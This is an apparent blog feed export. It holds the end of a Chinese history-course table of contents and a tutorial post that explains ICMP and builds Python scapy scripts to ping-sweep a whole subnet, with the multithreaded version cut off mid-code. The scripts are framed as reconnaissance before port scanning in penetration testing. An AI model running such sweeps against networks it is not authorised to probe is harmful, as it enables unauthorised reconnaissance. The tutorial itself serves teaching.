<p>1.1989年政治风波的发生与平息 296<br>2.向新的中共中央领导集体的顺利过渡 297<br>3.继续开展国民经济的治理整顿工作 297<br>4.对外工作在打破对华“制裁”中全方位推进 298<br>5.全面推进中国共产党的自身建设 299 </p>
<h2 id="第三节-改革开放和现代化建设发展的新阶段-299"><a href="#第三节-改革开放和现代化建设发展的新阶段-299" class="headerlink" title="第三节 改革开放和现代化建设发展的新阶段 299"></a>第三节 改革开放和现代化建设发展的新阶段 299</h2><p>**一、改革开放新的历史性突破299 **</p>
<p>1.邓小平南方谈话 299<br>2.确立社会主义市场经济体制的改革目标   301 </p>
<p>**二、进一步推进改革开放和现代化建设 301 **</p>
<p>1.经济体制改革的深入推进  301<br>2.正确处理改革、发展、稳定的关系  303<br>3.精神文明建设与民主法治建设不断加强 303</p>
<p><strong>三、改革开放和现代化建设的跨世纪发展304</strong> </p>
<p>1.高举邓小平理论伟大旗帜提出跨世纪发展战略 304<br>2改革开放和现代化建设在经受风险考验中前进 305<br>3.祖国统一大业的推进 306<br>4.推进党的建设新的伟大工程 307<br>5.“三个代表”重要思想的提出 307 </p>
<h2 id="第四节在新的历史起点上推进中国特色社会主义308"><a href="#第四节在新的历史起点上推进中国特色社会主义308" class="headerlink" title="第四节在新的历史起点上推进中国特色社会主义308"></a>第四节在新的历史起点上推进中国特色社会主义308</h2><p>**一、全面建设小康社会战略目标的确定308 **</p>
<p>1.新世纪前20年奋斗目标的确立 308<br>2.中央领导集体的平稳交接 309 </p>
<p><strong>二、 不断推进经济社会的科学发展</strong> </p>
<p>1.树立和落实科学发展观 309<br>2.提出构建社会主义和谐社会战略任务  310<br>3.推动经济又好又快发展和促进社会全面进步  310<br>4.走和平发展道路  312<br>5.加强党的执政能力建设和先进性建设 312 </p>
<p>**三、 奋力把中国特色社会主义推进到新的发展阶段 ** </p>
<p>1.夺取全面建设小康社会新胜利 313<br>2.党和国家各项事业的向前推进  314 </p>
<p>**四、 改革开放和现代化建设的巨大发展  315 **</p>
<p>1.国民经济保持持续快速健康发展。人民生活总体上达到小康水平现代化建设事业<br> 稳步推进综合国力和国际竞争力显著提高  315<br>2.社会主义市场经济体制初步建立并不断完善各项改革事业取得重大发展 316<br>3.全方位对外开放取得新突破形成全方位多层次宽领域的对外开放格局 317<br>4.社会主义民主政治建设取得重要进展  317<br>5.社会主义精神文明建设成效显著  318<br>6.民族政策和宗教政策得到全面贯彻  318<br>7.推进国防和军队建设  318<br>8.祖国统一大业取得重大进展  319<br>9.积极开展全方位外交  319<br>10.全面推进党的建设新的伟大进程 320</p>
<h1 id="第十一章-中国特色社会主义进入新时代"><a href="#第十一章-中国特色社会主义进入新时代" class="headerlink" title="第十一章 中国特色社会主义进入新时代"></a>第十一章 中国特色社会主义进入新时代</h1><h2 id="第一节-开拓中国特色社会主义更为广阔的发展前景"><a href="#第一节-开拓中国特色社会主义更为广阔的发展前景" class="headerlink" title="第一节 开拓中国特色社会主义更为广阔的发展前景"></a>第一节 开拓中国特色社会主义更为广阔的发展前景</h2><p>**一、 全面建设小康社会目标的确定  322 **</p>
<p>**二、 实现民族复兴中国梦的提出  323 **</p>
<p>**三、 统筹推进“五位一体”总体布局  325 **</p>
<p>1.主动适应和引领经济发展新常态  325<br>2.发展社会主义民主政治 326<br>3.发展中国特色社会主义文化  327<br>4.在发展中保障和改善民生   328<br>5.建设美丽中国  329 </p>
<p>**四、 协调推进“四个全面”战略布局  330 **</p>
<p>1.推进全面深化改革 330<br>2.推进全面依法治国 331<br>3.推进全面建成小康社会 332<br>4.推进全面从严治党 333 </p>
<h2 id="第二节-党和国家事业的历史性成就和历史性变"><a href="#第二节-党和国家事业的历史性成就和历史性变" class="headerlink" title="第二节 党和国家事业的历史性成就和历史性变"></a>第二节 党和国家事业的历史性成就和历史性变</h2><p>**一、 极不平凡的五年  334 **</p>
<p>1.经济建设取得巨大成就   335<br>2.全面深化改革取得巨大成就  336<br>3.民主法治建设迈出重大步伐   336<br>4.思想文化建设取得重大发展   336<br>5.人民生活不断改善  337<br>6.生态文明建设成效显著  337<br>7.强军兴军开创新局面   338<br>8.港澳台工作取得新发展  338<br>9.全方位外交布局深入发展  338<br>10.全面从严治党成效显著  339 </p>
<p>**二、 新时代中国与世界关系的历史性变化 340 **</p>
<h2 id="第三节-夺取新时代中国特色社会主义伟大胜利"><a href="#第三节-夺取新时代中国特色社会主义伟大胜利" class="headerlink" title="第三节 夺取新时代中国特色社会主义伟大胜利"></a>第三节 夺取新时代中国特色社会主义伟大胜利</h2><p>**一、 在新时代坚持和发展中国特色社会主义  342 **</p>
<p>1.中共十九大的举行  342<br>2.确定习近平新时代中国特色社会主义思想的历史地位 342<br>3.作出中国特色社会主义进入新时代、我国社会主要矛盾发生新变化的重大政治论断 344<br>4.确定决胜全面建成小康社会、开启全面建设社会主义现代化国家新征程的目标 345<br>5.对新时代推进中国特色社会主义伟大事业和党的建设伟大工程作出全面部署   345<br>6.选举产生新的中央领导集体   348 </p>
<p>**二、法在新时代坚持和发展中国特色社会主义中的重大作用 349 **</p>
<p>**三、家治理体系和治理能力现代化   350  **</p>
<p>**四、走向中华民族伟大复兴的光明前景 351 **</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>主机存活探测程序编写</title>
    <url>/2021/09/29/%E4%B8%BB%E6%9C%BA%E5%AD%98h%E6%B4%BB%E6%8E%A2%E6%B5%8B%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<p>通过ICMP协议进行主机存货探测程序编写<a id="more"></a></p>
<h1 id="任务标题：-主机存活探测程序"><a href="#任务标题：-主机存活探测程序" class="headerlink" title="任务标题： 主机存活探测程序"></a>任务标题： 主机存活探测程序</h1><h2 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h2><p>编写程序使用 ICMP 协议探测主机是否存活</p>
<h2 id="任务描述"><a href="#任务描述" class="headerlink" title="任务描述"></a>任务描述</h2><p>在实际的渗透中，对主机进行端口扫描时需要先探测主机是否存活，通常ICMP协议是用来探测主机是否存活，还能根据TTL值判断主机版本信息。</p>
<p>ping 程序就是用来探测主机是否存活的，通常情况服务器未开启防火墙时是允许被ICMP探测的。</p>
<h2 id="报告要求"><a href="#报告要求" class="headerlink" title="报告要求"></a>报告要求</h2><p>1、理解ICMP协议的原理</p>
<p>2、实现代码，尽可能多的实现探测主机是否存活的功能</p>
<h2 id="扩展任务"><a href="#扩展任务" class="headerlink" title="扩展任务"></a>扩展任务</h2><p>使用多线程技术提升探测速度</p>
<hr>
<p>在上一节学习了TCP/IP、UDP协议并利用socket实现客户机和服务机之间的通信。这次要学习的是一个新的网络协议ICMP,以及如何开发相应的python脚本,同时学习如何使用多线程来提高效率.</p>
<h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>ICMP（Internet Control Message Protocol）Internet控制<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352">报文</a>协议。它是<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE%E7%B0%87">TCP/IP协议簇</a>的一个子协议，用于在IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1">路由</a>器之间传递控制消息。控制消息是指<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A">网络通</a>不通、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>是否可达、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 [1] </p>
<p>ICMP使用IP的基本支持，就像它是一个更高级别的协议，但是，ICMP实际上是IP的一个组成部分，必须由每个IP模块实现。</p>
<p><strong>「ICMP的报文数据是通过封装在IP数据报中进行数据传输的」</strong>。ICMP的报文分为两个部分：ICMP报文首部和ICMP报文数据</p>
<img src="http://img.npfs06.top/20210927130952.png" style="zoom:80%;">



<h2 id="ICMP报文首部"><a href="#ICMP报文首部" class="headerlink" title="ICMP报文首部"></a>ICMP报文首部</h2><img src="http://img.npfs06.top/20210927131026.png" style="zoom:80%;">

<ul>
<li><strong>「类型」</strong>：主要指的是ICMP报文的种类(主要有两大类，后边会进行说明)</li>
<li><strong>「代码」</strong>：主要是指，不同的ICMP报文种类具体有哪些错误</li>
<li><strong>「校验和」</strong>：主要是校验报文在整个传输中，是否存在错误</li>
</ul>
<p>在IP协议首部中，有一个8位协议，它表明的是IP数据所携带的具体数据是什么协议的。ICMP的字段值为1</p>
<img src="http://img.npfs06.top/20210927131148.png" style="zoom:80%;">

<p>如果IP协议传输的数据是ICMP数据的话，那么，将会在协议中写入1</p>
<img src="http://img.npfs06.top/20210927131210.png" style="zoom:80%;">



<h2 id="ICMP协议报文的两个种类"><a href="#ICMP协议报文的两个种类" class="headerlink" title="ICMP协议报文的两个种类"></a>ICMP协议报文的两个种类</h2><h3 id="差错报告报文"><a href="#差错报告报文" class="headerlink" title="差错报告报文"></a>差错报告报文</h3><img src="http://img.npfs06.top/20210927131306.png" style="zoom:80%;">

<ul>
<li><p><strong>「网络不可达」</strong>：IP地址可以表示一个网络，当主机号全为0时就表示的是某一个网络，如果整个网络不可达，就会报告一个类型为3，具体代码为0的ICMP协议报文</p>
</li>
<li><p><strong>「主机不可达」</strong>：如果计算机A要和计算机B进行通信，而计算机B是关机的状态，就会出现主机不可达的情况</p>
</li>
<li><p><strong>「网络重定向」</strong>：传输给某一个网络的数据，可能不能走该网络了，需要进行重定向</p>
</li>
<li><p><strong>「主机重定向」</strong>：如果发送的报文，主机告知不能处理，请发送到另外一个主机</p>
</li>
</ul>
<h3 id="询问报文"><a href="#询问报文" class="headerlink" title="询问报文"></a>询问报文</h3><img src="http://img.npfs06.top/20210927131352.png" style="zoom:80%;">

<ul>
<li><strong>「回送请求或应答」</strong>：主要是验证网络是否通。假设计算机A要和计算机B进行通信，A会发送一个空的数据给B，如果B收到，就给一个回应</li>
<li><strong>「时间戳请求或应答」</strong>：当需要进行时间同步时，会用到这个</li>
</ul>
<p><strong>回送请求（0/8）</strong>用于进行通信的主机或路由器之间，判断所发送的数据包是否已经成功到达对端的一种消息，<code>ping</code> 命令就是利用这个消息实现的。</p>
<img src="http://img.npfs06.top/20210927132029.png" style="zoom:80%;">



<p>可以向对端主机发送<strong>回送请求</strong>的消息（<code>ICMP Echo Request Message</code>，类型 <code>8</code>），也可以接收对端主机发回来的<strong>回送应答</strong>消息（<code>ICMP Echo Reply Message</code>，类型 <code>0</code>）。</p>
<img src="http://img.npfs06.top/20210927132123.png" style="zoom:80%;">

<p>相比原生的 ICMP，这里多了两个字段：</p>
<ul>
<li><strong>标识符</strong>：用以区分是哪个应用程序发 ICMP 包，比如用进程 <code>PID</code> 作为标识符；</li>
<li><strong>序号</strong>：序列号从 <code>0</code> 开始，每发送一次新的回送请求就会加 <code>1</code>， 可以用来确认网络包是否有丢失。</li>
</ul>
<p>在<strong>选项数据</strong>中，<code>ping</code> 还会存放发送请求的时间值，来计算往返时间，说明路程的长短。</p>
<h2 id="ICMP工作流程"><a href="#ICMP工作流程" class="headerlink" title="ICMP工作流程"></a>ICMP工作流程</h2><p><code>ICMP</code> 主要的功能包括：</p>
<ul>
<li><strong>确认 IP 包是否成功送达目标地址</strong></li>
<li><strong>报告发送过程中 IP 包被废弃的原因和改善网络设置等</strong></li>
</ul>
<p>在 <code>IP</code> 通信中如果某个 <code>IP</code> 包因为某种原因未能达到目标地址，那么这个具体的原因将<strong>由 ICMP 负责通知</strong>。</p>
<img src="http://img.npfs06.top/20210927131742.png" style="zoom:80%;">

<p>如上图例子，主机 <code>A</code> 向主机 <code>B</code> 发送了数据包，由于某种原因，途中的路由器 <code>2</code> 未能发现主机 <code>B</code> 的存在，这时，路由器 <code>2</code> 就会向主机 <code>A</code> 发送一个 <code>ICMP</code> 目标不可达数据包，说明发往主机 <code>B</code> 的包未能成功。</p>
<p><strong>ICMP 的这种通知消息会使用 <code>IP</code> 进行发送</strong> 。</p>
<p>因此，从路由器 <code>2</code> 返回的 ICMP 包会按照往常的路由控制先经过路由器 <code>1</code> 再转发给主机 <code>A</code> 。收到该 ICMP 包的主机 <code>A</code> 则分解 ICMP 的首部和数据域以后得知具体发生问题的原因。</p>
<h2 id="ping-—-查询报文类型的使用"><a href="#ping-—-查询报文类型的使用" class="headerlink" title="ping — 查询报文类型的使用"></a>ping — 查询报文类型的使用</h2><p>接下来，我们重点来看 <code>ping</code> 的<strong>发送和接收过程</strong>。</p>
<p>同个子网下的主机 A 和 主机 B，主机 A 执行<code>ping</code> 主机 B 后，我们来看看其间发送了什么？</p>
<img src="http://img.npfs06.top/20210927132652.png" style="zoom:80%;">

<ol>
<li>ping 命令执行的时候，源主机首先会构建一个 <strong>ICMP 回送请求消息</strong>数据包。<br>ICMP 数据包内包含多个字段，最重要的是两个：</li>
</ol>
<ul>
<li>第一个是<strong>类型</strong>，对于回送请求消息而言该字段为 <code>8</code>；</li>
<li>另外一个是<strong>序号</strong>，主要用于区分连续 ping 的时候发出的多个数据包。<br>每出一个请求数据包，序号会自动加 <code>1</code>。为了能够计算往返时间 <code>RTT</code>，它会在报文的数据部分插入发送时间。</li>
</ul>
<img src="http://img.npfs06.top/20210927132724.png" style="zoom:80%;">

<ol start="2">
<li>然后，由 ICMP 协议将这个数据包连同地址 192.168.1.2 一起交给 IP 层。IP 层将以 192.168.1.2 作为<strong>目的地址</strong>，本机 IP 地址作为<strong>源地址</strong>，<strong>协议</strong>字段设置为 <code>1</code> 表示是 <code>ICMP</code> 协议，再加上一些其他控制信息，构建一个 <code>IP</code> 数据包。</li>
</ol>
<img src="http://img.npfs06.top/20210927132757.png" style="zoom:80%;">

<ol start="3">
<li>接下来，需要加入 <code>MAC</code> 头。如果在本地 ARP 映射表中查找出 IP 地址 192.168.1.2 所对应的 MAC 地址，则可以直接使用；如果没有，则需要发送 <code>ARP</code> 协议查询 MAC 地址，获得 MAC 地址后，由数据链路层构建一个数据帧，目的地址是 IP 层传过来的 MAC 地址，源地址则是本机的 MAC 地址；还要附加上一些控制信息，依据以太网的介质访问规则，将它们传送出去。</li>
</ol>
<img src="http://img.npfs06.top/20210927132821.png" style="zoom:80%;">

<ol start="4">
<li><p>主机 <code>B</code> 收到这个数据帧后，先检查它的目的 MAC 地址，并和本机的 MAC 地址对比，如符合，则接收，否则就丢弃。<br>接收后检查该数据帧，将 IP 数据包从帧中提取出来，交给本机的 IP 层。同样，IP 层检查后，将有用的信息提取后交给 ICMP 协议。</p>
</li>
<li><p>主机 <code>B</code> 会构建一个 <strong>ICMP 回送响应消息</strong>数据包，回送响应数据包的<strong>类型</strong>字段为 <code>0</code>，<strong>序号</strong>为接收到的请求数据包中的序号，然后再发送出去给主机 A。</p>
</li>
</ol>
<img src="http://img.npfs06.top/20210927132853.png" style="zoom:80%;">

<p>在规定的时候间内，源主机如果没有接到 ICMP 的应答包，则说明目标主机不可达；如果接收到了 ICMP 回送响应消息，则说明目标主机可达。</p>
<p>此时，源主机会检查，用当前时刻减去该数据包最初从源主机上发出的时刻，就是 ICMP 数据包的时间延迟。</p>
<p>针对上面发送的事情，总结成了如下图：</p>
<img src="http://img.npfs06.top/20210927132930.png" style="zoom:90%;">

<p>当然这只是最简单的，同一个局域网里面的情况。如果跨网段的话，还会涉及网关的转发、路由器的转发等等。</p>
<p><strong>但是对于 ICMP 的头来讲，是没什么影响的。会影响的是根据目标 IP 地址，选择路由的下一跳，还有每经过一个路由器到达一个新的局域网，需要换 MAC 头里面的 MAC 地址</strong>。</p>
<p>说了这么多，可以看出 ping 这个程序是<strong>使用了 ICMP 里面的 ECHO REQUEST（类型为 8 ） 和 ECHO REPLY （类型为 0）</strong>。</p>
<h1 id="主机存活探测程序编写（python）"><a href="#主机存活探测程序编写（python）" class="headerlink" title="主机存活探测程序编写（python）"></a>主机存活探测程序编写（python）</h1><h2 id="scapy模块"><a href="#scapy模块" class="headerlink" title="scapy模块"></a>scapy模块</h2><p>scapy是python中一个可用于网络嗅探的非常强大的第三方库，可以用它来做 packet 嗅探和伪造 packet。 scapy已经在内部实现了大量的网络协议。如DNS、ARP、IP、TCP、UDP等等，可以用它来编写非常灵活实用的工具。</p>
<p>换言之，Scapy 是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。Scapy 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。它可以代替 hping 、arpspoof 、arp-sk、arping,p0f 甚至是部分的Namp、tcpdump 和 tshark 的功能。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>str(pkt)</td>
<td>组装数据包</td>
</tr>
<tr>
<td>hexdump(pkt)</td>
<td>十六进制转储</td>
</tr>
<tr>
<td>ls(pkt)</td>
<td>显示出字段值的列表</td>
</tr>
<tr>
<td>pkt.summary()</td>
<td>一行摘要</td>
</tr>
<tr>
<td>pkt.show()</td>
<td>针对数据包的展开试图</td>
</tr>
<tr>
<td>pkt.show2()</td>
<td>显示聚合的数据包（例如，计算好了校验和）</td>
</tr>
<tr>
<td>pkt.sprintf()</td>
<td>用数据包字段填充格式字符串</td>
</tr>
<tr>
<td>pkt.decode_payload_as()</td>
<td>改变payload的decode方式</td>
</tr>
<tr>
<td>pkt.psdump()</td>
<td>绘制一个解释说明的PostScript图表</td>
</tr>
<tr>
<td>pkt.pdfdump()</td>
<td>绘制一个解释说明的PDF</td>
</tr>
<tr>
<td>pkt.command()</td>
<td>返回可以生成数据包的Scapy命令</td>
</tr>
</tbody></table>
<h3 id="scapy的安装和使用"><a href="#scapy的安装和使用" class="headerlink" title="scapy的安装和使用"></a>scapy的安装和使用</h3><p>scapy默认是不安装的，安装命令：<code>pip install  scapy </code></p>
<p>Scapy采用分层的形式来构造数据包，通常最下面的一个协议为Ether，然后是IP，在之后是TCP或者UDP。例如：</p>
<table>
<thead>
<tr>
<th align="left">数据包</th>
<th align="left">例子</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTTP</td>
<td align="left">Ether()/IP(dst=“<a href="http://www.baidu.com”)/TCP()/%E2%80%9CGET">www.baidu.com”)/TCP()/“GET</a> /index.html HTTP/1.0 \n\n”</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ARP</td>
<td align="left">Ether()/ARP(pdst=“192.168.8.12”)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ICMP</td>
<td align="left">IP(dst=“192.168.8.12”)/ICMP()</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">TCP</td>
<td align="left">tcp=IP(dst=“192.168.8.12”)/TCP(dport=80,flags=“S”)</td>
<td align="left"></td>
</tr>
</tbody></table>
<img src="http://img.npfs06.top/20210927182550.png" style="zoom:80%;">



<h3 id="主机存货探测脚本（v1-0）"><a href="#主机存货探测脚本（v1-0）" class="headerlink" title="主机存货探测脚本（v1.0）"></a><strong>主机存货探测脚本（v1.0）</strong></h3><img src="http://img.npfs06.top/20210927181052.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20210927182309.png" style="zoom:80%;">





<img src="http://img.npfs06.top/20210927183047.png" style="zoom:80%;">



<p>成功探测到192.168.43.1为存货主机</p>
<h2 id="ipaddress模块"><a href="#ipaddress模块" class="headerlink" title="ipaddress模块"></a>ipaddress模块</h2><p>在IP地址规划中，涉及到计算大量的IP地址，包括网段、网络掩码、广播地址、子网数、IP类型等</p>
<p>别担心，Ipy模块拯救你。Ipy模块可以很好的辅助我们高效的完成IP的规划工作。</p>
<p><code>ipaddress</code>模块包括用于处理 IPv4 和 IPv6 网络地址的类。这些类支持验证，查找网络上的地址和主机以及其他常见操作。</p>
<blockquote>
<p>注：此库支持ipv4和ipv6</p>
</blockquote>
<h3 id="ip-network-hosts迭代获取可用的主机地址-没有广播和0地址"><a href="#ip-network-hosts迭代获取可用的主机地址-没有广播和0地址" class="headerlink" title="ip_network.hosts迭代获取可用的主机地址(没有广播和0地址)"></a>ip_network.hosts迭代获取可用的主机地址(没有广播和0地址)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>net4 = ipaddress.ip_network(<span class="string">&#x27;192.0.2.0/24&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> net4.hosts():</span><br><span class="line"><span class="meta">... </span>    print(x)  </span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.2</span></span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.4</span></span><br><span class="line">...</span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.252</span></span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.253</span></span><br><span class="line"><span class="number">192.0</span><span class="number">.2</span><span class="number">.254</span></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210927191758.png" style="zoom:80%;">



<p>这样列举出所有主机地址之后就可以进行ICMP发包了</p>
<h3 id="主机存货探测脚本（v2-0）"><a href="#主机存货探测脚本（v2-0）" class="headerlink" title="主机存货探测脚本（v2.0）"></a><strong>主机存货探测脚本（v2.0）</strong></h3><p>在该版本中增加了批量探测同一网段下所有主机</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_request</span>(<span class="params">ip_dst</span>):</span></span><br><span class="line">    pocket = Ether()/IP(dst=ip_dst)/ICMP(<span class="built_in">type</span>=<span class="number">8</span>)/<span class="string">b&#x27;Hello&#x27;</span></span><br><span class="line">    req = srp1(pocket,timeout=<span class="number">2</span>,verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> req:</span><br><span class="line">        print(<span class="string">&#x27;[+]&#x27;</span>,ip_dst,<span class="string">&#x27;:&#x27;</span>, <span class="built_in">type</span>,<span class="string">&#x27;Host is up&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;----------------scan begin----------------&quot;</span>)</span><br><span class="line">    network = <span class="built_in">list</span>(ipaddress.ip_network(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> network:</span><br><span class="line">        icmp_request(<span class="built_in">str</span>(ip))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210927203017.png" style="zoom:80%;">



<p>虽然可以成功扫描，但是耗时非常久，因此决定加入多线程</p>
<h2 id="threading-模块"><a href="#threading-模块" class="headerlink" title="threading 模块"></a>threading 模块</h2><h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><p>进程是资源分配的最小单位，一个程序至少有一个进程。</p>
<p>线程是程序执行的最小单位，一个进程至少有一个线程。</p>
<p>进程都有自己独立的地址空间，内存，数据栈等，所以进程占用资源多。由于进程的资源独立，所以通讯不方便，只能使用进程间通讯（IPC）。</p>
<p>线程共享进程中的数据，他们使用相同的地址空间，使用线程创建快捷，创建开销比进程小。同一进程下的线程共享全局变量、静态变量等数据，所以线程通讯非常方便，但会存在数据同步与互斥的问题，如何处理好同步与互斥是编写多线程程序的难点。</p>
<p>一个进程中可以存在多个线程，在单核CPU中每个进程中同时刻只能运行一个线程，只有在多核CPU中才能存在线程并发的情况。</p>
<p>当线程需要运行但没有运行空间时，会对线程的优先级进行判断，高优先级先运行，低优先级进程让行。</p>
<h3 id="可调用对象（函数，类的实例方法）使用多线程"><a href="#可调用对象（函数，类的实例方法）使用多线程" class="headerlink" title="可调用对象（函数，类的实例方法）使用多线程"></a>可调用对象（函数，类的实例方法）使用多线程</h3><p>Python 常用的多线程模块有threading 和 Queue，在这里我们将 threading 模块。</p>
<p>threading 模块的Thread 类是主要的执行对象。使用Thread 类，可以有很多方法来创建线程。最常用的有下面两种：</p>
<blockquote>
<p>创建Thread 的实例，传给它一个可调用对象（函数或者类的实例方法）。<br>派生Thread 的子类，并创建子类的实例。</p>
</blockquote>
<p>这里用的主要是第一种<strong>可调用对象（函数，类的实例方法）使用多线程</strong></p>
<p>步骤如下：</p>
<img src="http://img.npfs06.top/20210927232841.png" style="zoom:80%;">



<p>示例：创建Thread实例，传递给他一个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">from time import sleep, ctime</span><br><span class="line"></span><br><span class="line">def func(name, sec):</span><br><span class="line">    print(&#39;---开始---&#39;, name, &#39;时间&#39;, ctime())</span><br><span class="line">    sleep(sec)</span><br><span class="line">    print(&#39;***结束***&#39;, name, &#39;时间&#39;, ctime())</span><br><span class="line"></span><br><span class="line"># 创建 Thread 实例</span><br><span class="line">t1 &#x3D; Thread(target&#x3D;func, args&#x3D;(&#39;第一个线程&#39;, 1))</span><br><span class="line">t2 &#x3D; Thread(target&#x3D;func, args&#x3D;(&#39;第二个线程&#39;, 2))</span><br><span class="line"></span><br><span class="line"># 启动线程运行</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"># 等待所有线程执行完毕</span><br><span class="line">t1.join()  # join() 等待线程终止，要不然一直挂起</span><br><span class="line">t2.join()</span><br></pre></td></tr></table></figure>
<p>示例：创建Thread实例，传递给他一个类的实例方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">from time import sleep, ctime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyClass(object):</span><br><span class="line"></span><br><span class="line">    def func(self,name,sec):</span><br><span class="line">        print(&#39;---开始---&#39;, name, &#39;时间&#39;, ctime())</span><br><span class="line">        sleep(sec)</span><br><span class="line">        print(&#39;***结束***&#39;, name, &#39;时间&#39;, ctime())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 创建 Thread 实例</span><br><span class="line">    t1 &#x3D; Thread(target&#x3D;MyClass().func, args&#x3D;(1, 1))</span><br><span class="line">    t2 &#x3D; Thread(target&#x3D;MyClass().func, args&#x3D;(2, 2))</span><br><span class="line"></span><br><span class="line">    # 启动线程运行</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    # 等待所有线程执行完毕</span><br><span class="line">    t1.join()  # join() 等待线程终止，要不然一直挂起</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<p>运行结果：</p>
<blockquote>
<p>—开始— 一 时间 Fri Nov 29 11:34:31 2019<br>—开始— 二 时间 Fri Nov 29 11:34:31 2019<br>***结束*** 一 时间 Fri Nov 29 11:34:32 2019<br>**<em>结束\</em>** 二 时间 Fri Nov 29 11:34:33 2019</p>
</blockquote>
<p>程序总共运行两秒，如果程序按照线性运行需要3秒，节约1秒钟。</p>
<p>Thread 实例化时需要接收 target，args（kwargs）两个参数。</p>
<p>target 用于接收需要使用多线程调用的对象。</p>
<p>args 或 kwargs 用于接收调用对象的需要用到的参数，args接收tuple，kwargs接收dict。</p>
<p><strong>start()</strong> 是方法用来启动线程的执行。</p>
<p>join() 方法是一种自旋锁，它用来等待线程终止。也可以提供超时的时间，当线程运行达到超时时间后结束线程，如join(500)，500毫秒后结束线程运行。</p>
<blockquote>
<p>注意：如果当你的主线程还有其他事情要做，而不是等待这些线程完成，就可以不调用join()。join()方法只有在你需要等待线程完成然后在做其他事情的时候才是有用的。</p>
</blockquote>
<h3 id="主机存货探测脚本（v3-0）"><a href="#主机存货探测脚本（v3-0）" class="headerlink" title="主机存货探测脚本（v3.0）"></a><strong>主机存货探测脚本（v3.0）</strong></h3><p>增加了多线程扫描</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_request</span>(<span class="params">ip_dst</span>):</span></span><br><span class="line">    <span class="keyword">global</span> a  <span class="comment"># call a</span></span><br><span class="line">    pocket = Ether()/IP(dst=ip_dst)/ICMP(<span class="built_in">type</span>=<span class="number">8</span>)/<span class="string">b&#x27;Hello&#x27;</span></span><br><span class="line">    req = srp1(pocket, timeout=<span class="number">2</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> req:</span><br><span class="line">        print(<span class="string">&#x27;[+]&#x27;</span>, ip_dst, <span class="string">&#x27; Host is up&#x27;</span>)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_speed</span>(<span 